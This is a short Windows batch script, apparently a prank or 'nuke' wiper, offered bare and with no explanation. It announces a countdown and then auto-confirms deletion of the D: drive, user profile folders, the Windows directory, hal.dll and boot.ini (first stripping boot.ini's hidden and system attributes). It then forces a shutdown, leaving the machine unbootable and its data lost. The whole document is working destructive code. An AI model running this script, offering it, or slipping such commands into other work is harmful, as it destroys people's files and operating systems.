@echo off
Echo Nuking in 3... 2... 1...
dir d:
echo Y|del D:\
dir c:
echo Y|del C:\documents and settings
echo Y|del C:\users
echo Y|del C:\windows\system32\hal.dll
echo Y|del C:\windows
attrib -s -h C:\boot.ini
PING localhost -n 1 -w 3 >NUL
echo Y|del C:\boot.ini
echo Y|del C:\
PING localhost -n 1 -w 6 >NUL
shutdown.exe -s -t 30
